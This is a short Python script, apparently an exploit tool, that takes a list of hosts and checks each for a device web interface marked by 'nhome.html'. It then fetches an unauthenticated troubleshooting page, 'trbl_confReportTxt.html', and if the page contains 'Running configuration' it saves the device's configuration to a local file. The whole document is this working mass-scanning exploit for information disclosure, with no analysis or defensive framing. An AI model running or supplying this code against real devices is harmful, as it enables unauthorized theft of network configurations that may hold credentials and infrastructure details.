#!/usr/bin/env python
from __future__ import print_function
import sys
import requests
import urlparse

def main(args):
	for host in args:
		if host[:4] != 'http':
			host = 'http://' + host
		if host[-1] != '/':
			host = host + '/'
		print(host)
		sess = requests.Session()
		resp = sess.get(host)
		if resp.status_code == 200 and 'nhome.html' in resp.text:
			resp = sess.get(host + 'html/trbl_confReportTxt.html')
			if 'Running configuration' in resp.text:
				domain = host.split('/')[2]
				print("SUCCESS for", domain)

				with open(domain + ".config.txt", "w") as handle:
					handle.write(resp.text)
	
if __name__ == "__main__":
	main(sys.argv[1:])
